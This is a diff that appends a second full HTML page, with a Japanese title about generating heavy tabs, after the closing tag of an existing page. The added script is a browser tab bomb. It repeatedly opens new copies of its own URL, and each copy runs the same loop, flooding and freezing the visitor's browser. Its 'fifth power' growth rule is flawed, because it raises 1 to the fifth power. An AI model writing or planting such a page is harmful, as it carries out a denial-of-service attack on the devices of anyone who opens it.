@@ -46,3 +46,51 @@
     </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>重いタブを生成</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        #status {
+            font-size: 1.5rem;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>タブを5乗ずつ増やす</h1>
+    <div id="status">タブ生成を開始します...</div>
+
+    <script>
+        let tabCount = 1;
+
+        function openTabsRecursively(count) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = `現在のタブ数: ${count}`;
+
+            // Open `count` new tabs
+            for (let i = 0; i < count; i++) {
+                window.open(window.location.href, '_blank');
+            }
+
+            // Calculate the next count (raise to the 5th power)
+            const nextCount = Math.pow(count, 5);
+
+            // Delay before the next round of tab creation
+            setTimeout(() => openTabsRecursively(nextCount), 2000);
+        }
+
+        // Start the recursive tab creation process
+        openTabsRecursively(tabCount);
+    </script>
+</body>
+</html>
